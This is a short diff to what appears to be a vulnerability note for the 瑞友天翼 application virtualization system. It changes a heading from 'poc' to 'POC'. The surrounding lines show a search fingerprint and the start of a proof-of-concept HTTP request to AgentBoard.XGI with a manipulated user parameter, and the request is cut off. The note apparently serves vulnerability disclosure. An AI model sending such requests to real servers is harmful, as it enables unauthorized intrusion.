@@ -7,7 +7,7 @@
 title="瑞友天翼-应用虚拟化系统" 
 ```
 
-## poc
+## POC
 ```
 GET /AgentBoard.XGI?user=/AgentBoard.XGI?user=-1&cmd=UserLogin HTTP/1.1
 Host: target
